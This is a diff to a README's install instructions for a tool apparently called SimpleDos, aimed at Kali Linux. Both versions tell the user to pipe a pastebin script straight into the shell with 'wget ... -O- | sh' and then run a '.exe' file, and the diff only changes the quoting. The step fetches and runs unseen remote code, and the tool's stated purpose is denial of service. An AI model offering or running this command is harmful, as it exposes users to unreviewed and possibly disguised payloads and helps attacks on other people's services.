@@ -7,6 +7,7 @@
 ### ❓How to install it❓
 1) apt install wget -y
 2) If you use Kali Linux:
-2.1) ⬇Download installer script: <wget https://pastebin.com/raw/82CxqjFS -O- | sh>
-2.2) ⤵Change directory: <cd SimpleDosKali>
-2.3) 🔴Run the utility: <./SimpleDos.exe>
+
+2.1) ⬇Download installer script: 'wget https://pastebin.com/raw/82CxqjFS -O- | sh'
+2.2) ⤵Change directory: 'cd SimpleDosKali'
+2.3) 🔴Run the utility: './SimpleDos.exe'
